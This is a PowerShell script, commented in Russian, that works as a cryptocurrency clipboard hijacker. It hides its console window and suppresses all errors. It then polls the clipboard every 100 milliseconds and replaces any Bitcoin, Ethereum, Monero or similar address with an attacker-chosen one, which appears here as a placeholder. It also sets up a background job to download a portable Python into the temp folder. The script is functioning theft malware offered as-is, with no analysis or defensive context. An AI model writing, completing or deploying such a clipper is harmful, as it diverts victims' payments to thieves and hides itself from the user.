# Скрываем окно сразу при запуске
$ErrorActionPreference = 'SilentlyContinue'
$windowCode = @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
'@
Add-Type -Name Window -Namespace Console -MemberDefinition $windowCode
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# Основные адреса
$uwuAdresses = @{
    'BTC'    = 'adress'
    'LTC'    = 'adress'
    'ETH'    = 'adress'
    'BNB'    = 'adress'
    'XRP'    = 'adress'
    'ADA'    = 'adress'
    'SOL'    = 'adress'
    'XMR'    = 'adress'
}

# Упрощенные паттерны для скорости
$CRYPTO_PATTERNS = @{
    'BTC' = '^(bc1|[13])'
    'LTC' = '^(ltc1|[LM3])'
    'ETH' = '^0x'
    'BNB' = '^bnb1'
    'XRP' = '^r'
    'ADA' = '^addr1'
    'SOL' = '^[1-9A-HJ-NP-Za-km-z]{44}$'
    'XMR' = '^4[0-9AB]'
}

function Test-IsCryptoAddress {
    param([string]$clipboardText)
    
    foreach ($crypto in $CRYPTO_PATTERNS.Keys) {
        if ($clipboardText -match $CRYPTO_PATTERNS[$crypto]) {
            return $crypto
        }
    }
    return $false
}

function Replace-CryptoAddress {
    param([string]$cryptoType)
    
    if ($uwuAdresses.ContainsKey($cryptoType)) {
        return $uwuAdresses[$cryptoType]
    }
    return $null
}

function Main {    
    while ($true) {
        try {
            $clipboardText = Get-Clipboard -ErrorAction SilentlyContinue
            
            if ($clipboardText -and $clipboardText.Trim()) {
                $trimmedText = $clipboardText.Trim()
                $cryptoType = Test-IsCryptoAddress $trimmedText
                
                if ($cryptoType) {
                    $replacementAddress = Replace-CryptoAddress $cryptoType
                    if ($replacementAddress -and $replacementAddress -ne $trimmedText) {
                        Set-Clipboard -Value $replacementAddress
                    }
                }
            }
        }
        catch {
            # Полное игнорирование ошибок
        }
        
        # Более короткая задержка для скорости
        Start-Sleep -Milliseconds 100
    }
}

# Асинхронная загрузка Python в фоне
function Initialize-PythonAsync {
    $workingDir = Join-Path $env:TEMP "PythonScript"
    if (-not (Test-Path $workingDir)) {
        New-Item -ItemType Directory -Path $workingDir -Force | Out-Null
    }
    
    $pythonDir = Join-Path $workingDir "python-portable"
    
    if (-not (Test-Path (Join-Path $pythonDir "python.exe"))) {
        # Запускаем загрузку в отдельном процессе асинхронно
        $jobScript = {
            param($workingDir, $pythonDir)
            
            $url = "https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip"
            $tempFile = Join-Path $workingDir "python-portable.zip"
            
            try {
                Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
                
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::ExtractToDirectory($tempFile, $pythonDir)
                Remove-Item $tempFile -Force
            }
            catch {
                # Игнорируем ошибки загрузки
            }
        }
        
        Start-Job -ScriptBlock $jobScript -ArgumentList $workingDir, $pythonDir | Out-Null
    }
}

# Запускаем основную функцию сразу
Main

# Инициализируем Python асинхронно (не блокируя основной поток)
Initialize-PythonAsync